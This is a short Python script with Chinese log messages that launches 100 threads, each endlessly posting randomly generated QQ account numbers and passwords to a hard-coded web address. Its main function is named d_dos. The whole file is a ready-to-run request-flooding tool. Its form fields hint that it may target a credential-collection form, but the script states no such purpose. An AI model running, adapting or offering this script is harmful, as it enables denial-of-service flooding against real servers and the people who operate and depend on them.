import requests
import threading
import random
from datetime import datetime
from time import sleep

lock = threading.Lock()
api = 'http://ossweb-img.qq.com/images/js/milo_bundle/biz/login.js?20130701'
header = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36'
}
success_count = 0
error_count = 0

def log(text):
    print(datetime.now().strftime('%Y-%m-%d %H:%M:%S'),text)

def d_dos():
    session = requests.session()
    session.headers = header
    global error_count
    global success_count
    while True:
        user,password = random_user_pass()
        data = {
            'qq':user,
            'mima':password,
            'MM_insert':'form1'
        }
        try:
            r = session.post(api,data=data,timeout=5)
        except:
            lock.acquire()
            log('报错，直接跳过... *{}'.format(error_count))
            error_count += 1
            lock.release()
            continue
        code = r.status_code
        lock.acquire()
        if code == 200:
            log('提交成功...OK! *{} 账号:{}，密码: {}'.format(success_count,user,password))
            success_count +=1
        else:
            log('提交失败...failed! *{} 状态码:{}'.format(error_count,r.status_code))
            error_count += 1
        lock.release()

def random_user_pass():
    user = random.randint(10**5,10**10)
    password = ''
    password_len = random.randint(9,28)
    for i in range(password_len):
        code = random.randint(48,122)
        password += chr(code)
    return user,password

if __name__ == '__main__':
    thread_num = 100
    for i in range(thread_num):
        threading.Thread(target=d_dos).start()
        log('线程{}启动...'.format(i))
        sleep(0.1)
